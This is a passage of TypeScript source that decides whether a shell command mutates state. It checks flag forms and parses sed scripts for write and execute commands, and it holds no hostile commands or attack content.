    if (arg.includes("$") && argsHaveExpandableDollar[index] === true) return true;

    // Mode 1: exact token.
    if (flagSet.has(arg)) return true;

    // Mode 2: `--flag=value` prefix for long flags.
    if (arg.startsWith("--")) {
      const eq = arg.indexOf("=");
      if (eq > 0 && flagSet.has(arg.slice(0, eq))) return true;
      continue; // long flag — skip short-cluster check
    }

    // Mode 3: short-flag cluster/glue matching.
    // Applies only to single-dash args and verbs with known mutating letters.
    if (arg.startsWith("-") && shortLetters !== undefined) {
      // Extract the leading letter-cluster (stops at first non-ASCII-letter).
      const cluster = /^-([A-Za-z]+)/.exec(arg);
      if (cluster !== null) {
        for (const letter of cluster[1]!) {
          if (shortLetters.has(letter)) return true;
        }
      }
    }
  }
  if (verb === "sed" && hasMutatingSedProgram(args)) return true;
  return false;
}

function hasMutatingSedProgram(args: readonly string[]): boolean {
  let expressionExpected = false;
  let implicitScriptSeen = false;

  for (const arg of args) {
    if (expressionExpected) {
      if (sedScriptHasWriteOrExec(arg)) return true;
      expressionExpected = false;
      continue;
    }

    if (arg === "-e" || arg === "--expression") {
      expressionExpected = true;
      continue;
    }
    if (arg.startsWith("--expression=")) {
      if (sedScriptHasWriteOrExec(arg.slice("--expression=".length))) return true;
      continue;
    }
    if (arg.startsWith("-e") && arg.length > 2) {
      if (sedScriptHasWriteOrExec(arg.slice(2))) return true;
      continue;
    }

    if (arg === "-f" || arg === "--file" || arg.startsWith("-f") || arg.startsWith("--file=")) {
      return true;
    }

    if (arg === "--") {
      implicitScriptSeen = false;
      continue;
    }
    if (arg.startsWith("-")) {
      continue;
    }
    if (!implicitScriptSeen) {
      implicitScriptSeen = true;
      if (sedScriptHasWriteOrExec(arg)) return true;
    }
  }

  return expressionExpected;
}

function sedScriptHasWriteOrExec(script: string): boolean {
  let i = 0;
  while (i < script.length) {
    i = skipSedSeparators(script, i);
    if (i >= script.length) break;

    const commandStart = skipSedAddresses(script, i);
    if (commandStart < 0 || commandStart >= script.length) break;
    i = commandStart;

    if (script[i] === "!") {
      i = skipSedWhitespace(script, i + 1);
      if (i >= script.length) break;
    }

    const command = script[i];
    if (command === "#") {
      i = skipToSedLineEnd(script, i + 1);
      continue;
    }
    if (command === "{") {
      i += 1;
      continue;
    }
    if (command === "}") {
      i += 1;
      continue;
    }
    if (command === "w" || command === "W" || command === "e" || command === "r" || command === "R") {
      return true;
    }
    if (command === "s") {
      const result = parseSedSubstitute(script, i);
      if (result.mutating) return true;
      i = result.next;
      continue;
    }

    i = skipToNextSedCommand(script, i + 1);
  }
  return false;
}

function skipSedSeparators(script: string, i: number): number {
  while (i < script.length) {
    const ch = script[i];
    if (ch === ";" || ch === "\n" || ch === "\r" || /\s/.test(ch)) {
      i += 1;
      continue;
    }
    break;
  }
  return i;
}

function skipSedWhitespace(script: string, i: number): number {
  while (i < script.length && /\s/.test(script[i]!)) i += 1;
  return i;
}

function skipSedAddresses(script: string, start: number): number {
  let i = start;
  for (let count = 0; count < 2; count += 1) {
    i = skipSedWhitespace(script, i);
    const next = skipSedAddress(script, i);
    if (next === i) break;
    i = skipSedWhitespace(script, next);
    if (script[i] === ",") {
      i += 1;
      continue;
    }
    break;
  }
  return i;
}

function skipSedAddress(script: string, i: number): number {
  const ch = script[i];
  if (ch === undefined) return i;
  if (/[0-9]/.test(ch)) {
    i += 1;
    while (i < script.length && /[0-9~+]/.test(script[i]!)) i += 1;
    return i;
  }
  if ((ch === "+" || ch === "~") && /[0-9]/.test(script[i + 1] ?? "")) {
    i += 2;
    while (i < script.length && /[0-9]/.test(script[i]!)) i += 1;
    return i;
  }
  if (ch === "$") return i + 1;
  if (ch === "/") return skipSedDelimited(script, i + 1, "/");
  if (ch === "\\" && i + 1 < script.length) {
    return skipSedDelimited(script, i + 2, script[i + 1]!);
  }
  return i;
}

function parseSedSubstitute(script: string, start: number): { mutating: boolean; next: number } {
  if (start + 1 >= script.length) return { mutating: false, next: start + 1 };
  const delimiter = script[start + 1]!;
  if (/\s/.test(delimiter)) return { mutating: false, next: start + 1 };
  const patternEnd = skipSedDelimited(script, start + 2, delimiter);
  if (patternEnd >= script.length) return { mutating: false, next: patternEnd };
  const replacementEnd = skipSedDelimited(script, patternEnd, delimiter);
  if (replacementEnd >= script.length) return { mutating: false, next: replacementEnd };

  let i = replacementEnd;
  while (i < script.length && script[i] !== ";" && script[i] !== "\n" && script[i] !== "\r") {
    const flag = script[i]!;
    if (flag === "w" || flag === "e") return { mutating: true, next: i + 1 };
    i += 1;
  }
  return { mutating: false, next: i };
}

function skipSedDelimited(script: string, start: number, delimiter: string): number {
  let escaped = false;
  for (let i = start; i < script.length; i += 1) {
    const ch = script[i]!;
    if (escaped) {
      escaped = false;
      continue;
    }
    if (ch === "\\") {
      escaped = true;
      continue;
    }
    if (ch === delimiter) return i + 1;
  }
  return script.length;
}

function skipToNextSedCommand(script: string, start: number): number {
  let escaped = false;
  for (let i = start; i < script.length; i += 1) {
    const ch = script[i]!;
    if (escaped) {
      escaped = false;
      continue;
    }
    if (ch === "\\") {
      escaped = true;
      continue;
    }
    if (ch === ";" || ch === "\n" || ch === "\r") return i + 1;
  }
  return script.length;
}

function skipToSedLineEnd(script: string, start: number): number {
  for (let i = start; i < script.length; i += 1) {
    if (script[i] === "\n" || script[i] === "\r") return i + 1;
  }
  return script.length;
}

/** Reduce `/usr/bin/ls` → `ls`; leave bare verbs unchanged. */
function stripPath(token: string): string {
  const slash = token.lastIndexOf("/");
  return slash >= 0 ? token.slice(slash + 1) : token;
}
